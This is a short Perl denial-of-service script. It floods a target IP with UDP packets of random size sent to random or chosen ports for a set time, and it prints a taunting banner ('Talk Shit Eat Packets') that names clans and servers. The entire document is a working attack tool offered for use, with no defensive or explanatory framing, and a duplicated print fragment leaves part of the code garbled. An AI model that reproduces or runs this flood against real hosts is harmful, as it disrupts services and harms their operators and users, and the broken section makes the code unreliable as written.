#!/usr/bin/perl
 
##
# PERL DoS Script
##
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print <<EOTEXT;
                ==========================================
                +               ANONYMOUS                +
                ==========================================
                +           Kik oServers
                +           DamonOnCFW Runs U
                +                      &                 +
                +         Wars Clan Running shits        +
                + .--.                  o                +
                + |--'.--..-. .--.--.   .  .  . .--.--.  +
                + |   |  (.-' |  |  |   |  |  | |  |  |  +
                + '   '   `--''  '  `--' `-`--`-'  '  `- +
                ==========================================
                +            Talk Shit Eat Packets       +
                +         Stop DoSing with Ctrl+C        +
                ==========================================     
EOTEXT
 
 print           "                                YoUr FaRtInG oN $ip
                        On port " .
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit get FaRted On. ") . "\n";
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit get FaRted On. ") . "\n";
        print "Stop DoSing with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
